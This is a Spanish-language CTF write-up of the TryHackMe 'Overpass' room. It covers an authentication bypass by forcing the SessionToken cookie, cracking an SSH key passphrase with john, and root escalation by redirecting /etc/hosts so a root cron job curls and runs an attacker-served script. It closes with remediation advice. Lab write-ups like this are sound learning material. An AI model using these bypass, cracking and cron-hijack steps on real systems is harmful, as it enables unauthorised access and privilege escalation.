# Overpass

**Conceptos clave:** dirsearch brute‑force, SessionToken manipulation, RSA private key extraction, SSH key cracking (john/ssh2john), cron buildscript abuse, /etc/hosts hijack, root flag exfiltration.
**Dificultad:** 🟢 Fácil
**Plataforma:** TryHackMe (room: Overpass by g0at)
**Fecha:** 19 de noviembre de 2026

## 1. Reconocimiento (Recon)

### 1.1 Escaneo rápido de puertos
```bash
nmap -p- --open -T5 -v -n <IP>
```
Solo el puerto **80** estaba abierto.

### 1.2 Descubrimiento de la página de descargas
Visitamos `http://<IP>/downloads/` y descargamos el código fuente del gestor de contraseñas escrito en **Go** y el script de compilación.

## 2. Enumeración de directorios (Dirsearch)
```bash
python3 dirsearch.py -u http://<IP>/ -e html,js,php
```
Entre los resultados apareció la ruta **/admin/?/login**.

## 3. Bypass de autenticación mediante cookie
Observamos el código JavaScript de `login.js`:
```js
if (statusOrCookie === "Incorrect credentials") {
    loginStatus.textContent = "Incorrect Credentials"
    passwordBox.value=""
} else {
    Cookies.set("SessionToken",statusOrCookie)
    window.location = "/admin"
}
```
Al enviar credenciales erróneas obteníamos la cadena **"Incorrect credentials"**; con credenciales válidas el servidor devolvía un **token** que se almacenaba en la cookie `SessionToken` y redirigía a `/admin`.

Probamos a forzar la cookie:
```bash
# En el navegador (devtools console)
Cookies.set("SessionToken",400)
```
Al recargar `/admin` la aplicación mostraba una **clave RSA privada**.

### 3.1 Extracción de la clave RSA
Guardamos la clave en `id_rsa`.

## 4. Acceso por SSH

### 4.1 Obtención del passphrase
```bash
# Convertir la clave a hash para John
ssh2john.py id_rsa > id_rsa.hashes
```
```bash
# Cracking con John (rockyou wordlist)
john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hashes
```
Obtenido el passphrase, nos conectamos como usuario **james**:
```bash
ssh -i id_rsa james@<IP>
```
Una vez dentro, leímos la flag de usuario:
```bash
cat /home/james/user.txt
```

## 5. Escalada de privilegios

### 5.1 Información de escalada
En `~/todo.txt` había pistas sobre:
- Un manager de contraseñas con credenciales guardadas en `~/.overpass`.
- Un algoritmo ROT47 usado para cifrar esas credenciales.
- Un cron que ejecuta **buildscript.sh** cada minuto como **root**.

### 5.2 Análisis del cron
```bash
cat /etc/cron.d/overpass-build
```
Mostraba:
```bash
* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
```
El script compila el gestor para varios SO y escribe `Builds completed` en `/root/buildStatus`.

### 5.3 Hijacking de /etc/hosts
El archivo `/etc/hosts` era editable por el usuario **james**. Cambiamos la IP de `overpass.thm` por nuestra IP VPN:
```bash
vim /etc/hosts   # reemplazar la línea con 10.10.210.84 por <MI_IP_VPN>
```
De este modo, cuando el cron ejecuta `curl overpass.thm/...` solicita nuestro servidor.

### 5.4 Creación del script malicioso
En nuestro host servimos **malicious.sh** con el siguiente contenido:
```bash
#!/bin/bash
cat /root/root.txt > /home/james/stuff.txt
```
Se lanzó un servidor web sencillo:
```bash
python3 -m http.server 80 --bind <MI_IP_VPN>
```
Cuando el cron obtuvo el script, lo ejecutó como **root** y la flag de root quedó copiada a `/home/james/stuff.txt`.

### 5.5 Recuperación de la flag de root
```bash
cat /home/james/stuff.txt   # contiene el contenido de /root/root.txt
```
Obtuvimos la flag `root.txt`.

## 6. Flags
| Flag | Ruta |
|------|------|
| `user.txt` | `/home/james/user.txt` |
| `root.txt` | `/home/james/stuff.txt` |

## 7. Mitigación / Remediación
- **Validar entradas y cookies**: no confiar en valores suministrados por el cliente; usar firmas/HMAC para tokens.
- **Hardening de cron**: evitar que scripts externos se ejecuten como root; usar rutas absolutas y limitar permisos de escritura en `/etc/hosts`.
- **Principio de menor privilegio**: eliminar permisos de escritura en `/etc/hosts` para usuarios no privilegiados.
- **Rot47**: sustituir por cifrado fuerte (AES‑GCM) y almacenar credenciales en un vault.
- **Actualizaciones**: mantener Go y dependencias actualizadas; revisar scripts de compilación automatizadas.
- **Control de acceso a claves SSH**: usar passphrases robustas y rotar claves regularmente.

*Escrito por Juan Merino Garrido – Estudiante de Ingeniería Informática*